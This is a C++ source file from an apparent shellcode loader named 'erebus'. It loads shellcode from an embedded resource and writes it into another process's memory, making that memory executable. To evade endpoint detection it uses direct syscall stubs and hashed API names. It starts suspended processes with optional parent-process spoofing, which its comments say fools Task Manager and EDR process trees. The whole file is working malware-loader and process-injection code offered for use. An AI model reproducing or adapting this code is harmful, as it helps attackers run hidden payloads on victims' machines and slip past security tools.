#include "../../include/loader.hpp"
#include "../../include/evasion/syscall_backend.hpp"

namespace erebus {
	BOOL StageResource(IN int resource_id, IN LPCWSTR resource_class, OUT PBYTE* shellcode, OUT SIZE_T* shellcode_size)
	{
		BOOL success = FALSE;
		PVOID shellcode_address;

		HRSRC resource_handle = FindResourceW(nullptr, MAKEINTRESOURCEW(resource_id), resource_class);
		if (!resource_handle)
		{
			LOG_ERROR("Failed to get resource handle. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		DWORD resource_size = SizeofResource(nullptr, resource_handle);

		HGLOBAL global_handle = LoadResource(nullptr, resource_handle);
		if (!global_handle)
		{
			LOG_ERROR("Failed to get global handle. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		PVOID resource_pointer = LockResource(global_handle);
		if (!resource_pointer)
		{
			LOG_ERROR("Failed to get resource pointer. (Code: 0x%08lX)", GetLastError());
			return success;
		}

		shellcode_address = HeapAlloc(resource_size);
		if (shellcode_address)
		{
			RtlCopyMemory(shellcode_address, resource_pointer, resource_size);
			success = TRUE;
		}

		*shellcode_size = (SIZE_T)resource_size;
		*shellcode = (BYTE*)shellcode_address;
		return success;
	}

	PVOID WriteShellcodeInMemory(IN HANDLE process_handle, IN BYTE* shellcode, IN SIZE_T shellcode_size)
	{
		SIZE_T bytes_written = 0;
		PVOID base_address = NULL;
		DWORD old_protection = 0;
		SIZE_T allocation_size = shellcode_size;
		NTSTATUS status;

		// Validate input
		if (!shellcode || shellcode_size == 0)
		{
			LOG_ERROR("Invalid shellcode pointer or size");
			return NULL;
		}

		HMODULE ntdll = erebus::GetModuleHandleC(H("ntdll.dll"));
		if (!ntdll)
		{
			LOG_ERROR("Failed to get ntdll.dll handle");
			return NULL;
		}

		typeNtAllocateVirtualMemory NtAllocateVirtualMemory =
			(typeNtAllocateVirtualMemory)erebus::evasion::GetSyscallStub(H("NtAllocateVirtualMemory"));
		if (!NtAllocateVirtualMemory)
			NtAllocateVirtualMemory = (typeNtAllocateVirtualMemory)
				erebus::GetProcAddressC(ntdll, H("NtAllocateVirtualMemory"));

		typeNtWriteVirtualMemory NtWriteVirtualMemory =
			(typeNtWriteVirtualMemory)erebus::evasion::GetSyscallStub(H("NtWriteVirtualMemory"));
		if (!NtWriteVirtualMemory)
			NtWriteVirtualMemory = (typeNtWriteVirtualMemory)
				erebus::GetProcAddressC(ntdll, H("NtWriteVirtualMemory"));

		typeNtProtectVirtualMemory NtProtectVirtualMemory =
			(typeNtProtectVirtualMemory)erebus::evasion::GetSyscallStub(H("NtProtectVirtualMemory"));
		if (!NtProtectVirtualMemory)
			NtProtectVirtualMemory = (typeNtProtectVirtualMemory)
				erebus::GetProcAddressC(ntdll, H("NtProtectVirtualMemory"));

		typeNtFreeVirtualMemory NtFreeVirtualMemory =
			(typeNtFreeVirtualMemory)erebus::evasion::GetSyscallStub(H("NtFreeVirtualMemory"));
		if (!NtFreeVirtualMemory)
			NtFreeVirtualMemory = (typeNtFreeVirtualMemory)
				erebus::GetProcAddressC(ntdll, H("NtFreeVirtualMemory"));

		if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory || !NtFreeVirtualMemory)
		{
			LOG_ERROR("Failed to resolve NT functions");
			return NULL;
		}

		status = NtAllocateVirtualMemory(process_handle, &base_address, 0, &allocation_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to allocate memory space (NTSTATUS: 0x%08lX)", status);
			return NULL;
		}
		LOG_SUCCESS("Address Pointer: 0x%p", base_address);

		// Write in chunks to support large shellcode sizes (>2MB)
		const SIZE_T max_chunk = 0x200000; // 2MB
		SIZE_T total_written = 0;
		SIZE_T remaining = shellcode_size;
		while (remaining > 0)
		{
			SIZE_T chunk = (remaining > max_chunk) ? max_chunk : remaining;
			SIZE_T chunk_written = 0;
			PVOID write_address = (PBYTE)base_address + total_written;
			PVOID write_buffer = (PBYTE)shellcode + total_written;

			status = NtWriteVirtualMemory(process_handle, write_address, write_buffer, chunk, &chunk_written);
			if (!NT_SUCCESS(status))
			{
				LOG_ERROR("Error writing shellcode chunk (NTSTATUS: 0x%08lX). (Wrote %zu/%zu bytes)", status, chunk_written, chunk);
				// [OPSEC] Free the remote allocation on write failure
				NtFreeVirtualMemory(process_handle, &base_address, &allocation_size, MEM_RELEASE);
				return NULL;
			}
			if (chunk_written != chunk)
			{
				LOG_ERROR("Incomplete chunk write: wrote %zu/%zu bytes", chunk_written, chunk);
				NtFreeVirtualMemory(process_handle, &base_address, &allocation_size, MEM_RELEASE);
				return NULL;
			}

			total_written += chunk_written;
			remaining -= chunk_written;
		}

		LOG_SUCCESS("Shellcode written to memory (%zu bytes).", total_written);

		status = NtProtectVirtualMemory(process_handle, &base_address, &allocation_size, PAGE_EXECUTE_READ, &old_protection);
		if (!NT_SUCCESS(status))
		{
			LOG_ERROR("Failed to change protection type (NTSTATUS: 0x%08lX)", status);
			// [OPSEC] Free leaked RW allocation on protection change failure
			NtFreeVirtualMemory(process_handle, &base_address, &allocation_size, MEM_RELEASE);
			return NULL;
		}

		LOG_SUCCESS("Protection changed to RX (was: 0x%lX).", old_protection);

		return base_address;
	}

	BOOL CreateProcessSuspended(IN wchar_t cmd[], OUT HANDLE* process_handle, OUT HANDLE* thread_handle)
	{
		PROCESS_INFORMATION process_info = {};

#if CONFIG_PPID_SPOOF == 1
		// PPID spoofing: inherit from a chosen parent so Task Manager and EDR
		// process-tree views show the spoofed process as the creator.
		// Requires at minimum PROCESS_DUP_HANDLE on the target parent.
		//
		// Implementation: STARTUPINFOEXW carries an attribute list that contains
		// PROC_THREAD_ATTRIBUTE_PARENT_PROCESS pointing to an open handle of the
		// chosen parent. CreateProcessW reads the attribute list at kernel entry
		// and sets the new process's parent PID before the first thread runs.
		//
		// Failure path: if the spoof parent is unavailable (process exited, handle
		// open fails), fall through to a plain CreateProcessW without spoofing.

		DWORD spoof_hash[1] = { (DWORD)CONFIG_PPID_SPOOF_TARGET_HASH };
		DWORD spoof_pid = ProcessGetPidFromHashedList(spoof_hash, 1);

		HANDLE h_parent = NULL;
		if (spoof_pid) {
			h_parent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoof_pid);
			if (!h_parent) {
				LOG_ERROR("PPID spoof: OpenProcess(%lu) failed (Code: 0x%08lX) - falling back",
				          spoof_pid, GetLastError());
			}
		} else {
			LOG_ERROR("PPID spoof: target process not found - falling back");
		}

		if (h_parent) {
			SIZE_T attr_size = 0;
			InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);

			LPPROC_THREAD_ATTRIBUTE_LIST attr_list =
				(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(attr_size);
			if (!attr_list) {
				CloseHandle(h_parent);
				goto plain_create;
			}

			if (!InitializeProcThreadAttributeList(attr_list, 1, 0, &attr_size)) {
				erebus::HeapFree(attr_list);
				CloseHandle(h_parent);
				goto plain_create;
			}

			if (!UpdateProcThreadAttribute(
				attr_list, 0,
				PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
				&h_parent, sizeof(HANDLE),
				NULL, NULL))
			{
				DeleteProcThreadAttributeList(attr_list);
				erebus::HeapFree(attr_list);
				CloseHandle(h_parent);
				goto plain_create;
			}

			STARTUPINFOEXW si_ex = {};
			si_ex.StartupInfo.cb = sizeof(STARTUPINFOEXW);
			si_ex.lpAttributeList = attr_list;

			BOOL success = CreateProcessW(
				NULL, cmd, NULL, NULL, FALSE,
				(CREATE_NO_WINDOW | CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT),
				NULL, NULL,
				&si_ex.StartupInfo,
				&process_info);

			DeleteProcThreadAttributeList(attr_list);
			erebus::HeapFree(attr_list);
			CloseHandle(h_parent);

			if (success) {
				LOG_INFO("PPID spoofed (PID %lu as parent)", spoof_pid);
			}

			*process_handle = process_info.hProcess;
			*thread_handle  = process_info.hThread;
			return success;
		}

plain_create:
#endif // CONFIG_PPID_SPOOF

		STARTUPINFOW startup_info = {};
		startup_info.cb = sizeof(STARTUPINFOW);

		BOOL success = CreateProcessW(
			NULL, cmd, NULL, NULL, FALSE,
			(CREATE_NO_WINDOW | CREATE_SUSPENDED),
			NULL, NULL,
			&startup_info,
			&process_info);

		*process_handle = process_info.hProcess;
		*thread_handle  = process_info.hThread;

		return success;
	}

	//
	// Uses NtOpenProcess to get a handle to the process from a given PID.
	// Returns NULL on failure.
	//
	HANDLE GetProcessHandle(DWORD process_id)
	{
		HMODULE ntdll = erebus::GetModuleHandleC(H("ntdll.dll"));

		typeNtOpenProcess NtOpenProcess =
			(typeNtOpenProcess)erebus::evasion::GetSyscallStub(H("NtOpenProcess"));
		if (!NtOpenProcess && ntdll)
			NtOpenProcess = (typeNtOpenProcess)
				erebus::GetProcAddressC(ntdll, H("NtOpenProcess"));

		if (!NtOpenProcess)
		{
			LOG_ERROR("Failed to resolve NtOpenProcess");
			return NULL;
		}

		HANDLE process = NULL;
		CLIENT_ID cid = { (PVOID)(ULONG_PTR)process_id, NULL };
		OBJECT_ATTRIBUTES obj_attr = {};
		InitializeObjectAttributes(&obj_attr, NULL, 0, NULL, NULL);

		NTSTATUS status = NtOpenProcess(
			&process,
			PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ |
			PROCESS_VM_WRITE | PROCESS_SET_QUOTA | PROCESS_QUERY_INFORMATION |
			PROCESS_DUP_HANDLE,
			&obj_attr,
			&cid);

		if (!NT_SUCCESS(status) || !process)
		{
			LOG_ERROR("NtOpenProcess failed for PID %lu (NTSTATUS: 0x%08lX)", process_id, status);
			return NULL;
		}

		LOG_SUCCESS("Process Handle: 0x%p (PID: %lu)", process, process_id);
		return process;
	}


	//
	// Free a block of memory in the current process' heap.
	// Returns TRUE on success, FALSE on failure.
	//
	BOOL HeapFree(_In_ PVOID BlockAddress)
	{
		HMODULE ntdll = ImportModule("ntdll.dll");
		if (!ntdll) return FALSE;
		ImportFunction(ntdll, RtlFreeHeap, typeRtlFreeHeap);
		if (!RtlFreeHeap) return FALSE;

		return RtlFreeHeap(GetProcessHeap(), 0, BlockAddress) ? TRUE : FALSE;
	}

	//
	// Allocate a block of memory in the current process' heap.
	// Returns a pointer to the allocated block, or NULL on failure.
	//
	PVOID HeapAlloc(_In_ SIZE_T Size)
	{
		HMODULE ntdll = ImportModule("ntdll.dll");
		if (!ntdll) return NULL;
		ImportFunction(ntdll, RtlAllocateHeap, typeRtlAllocateHeap);
		if (!RtlAllocateHeap) return NULL;

		// RtlAllocateHeap returns NULL on failure so no need to add error handling.
		return RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);
	}

	//
	// Uses NtQuerySystemInformation to enumerate processes and find the first occurance in the hashlist.
	// Returns NULL on failure.
	//
	DWORD ProcessGetPidFromHashedList(_In_ DWORD* HashList, _In_ SIZE_T EntryCount)
	{
		return ProcessGetPidFromHashedListEx(HashList, EntryCount, 0);
	}

	//
	// Extended version that returns the Nth matching process (skipCount = index to return)
	// Returns 0 on failure or if no more matches found.
	//
	DWORD ProcessGetPidFromHashedListEx(_In_ DWORD* HashList, _In_ SIZE_T EntryCount, _In_ SIZE_T skipCount)
	{
		HMODULE ntdll = ImportModule("ntdll.dll");
		if (!ntdll) return 0;

		ImportFunction(ntdll, NtQuerySystemInformation, typeNtQuerySystemInformation);
		if (!NtQuerySystemInformation) return 0;

		DWORD pid = 0, returnlength = 0, name_hash = 0;
		PSYSTEM_PROCESS_INFORMATION process = NULL, processinfoptr = NULL;
		NTSTATUS status = STATUS_SUCCESS;
		SIZE_T matchCount = 0;

		// Get size of systemprocessinformation
		NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS::SystemProcessInformation, NULL, 0, &returnlength);
		returnlength += 0x10000;
		if (returnlength == 0)
			return 0;

		process = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(returnlength);
		if (!process) return 0;

		status = NtQuerySystemInformation(SystemProcessInformation, process, returnlength, &returnlength);
		if (!NT_SUCCESS(status))
			goto CLEANUP;

		processinfoptr = process;
		do
		{
			if (processinfoptr->ImageName.Buffer)
			{
				name_hash = erebus::HashStringFowlerNollVoVariant1a(processinfoptr->ImageName.Buffer);
				for (size_t i = 0; i < EntryCount; i++)
				{
					if (HashList[i] == name_hash)
					{
						if (matchCount == skipCount) {
							pid = (DWORD)(UINT_PTR)processinfoptr->UniqueProcessId;
							goto CLEANUP;
						}
						matchCount++;
						break;
					}
				}
			}

			processinfoptr = (PSYSTEM_PROCESS_INFORMATION)(((PBYTE)processinfoptr) + processinfoptr->NextEntryOffset);
		} while (processinfoptr->NextEntryOffset);

	CLEANUP:
		if (process)
			HeapFree(process);

		return pid;
	}
} // namespace erebus
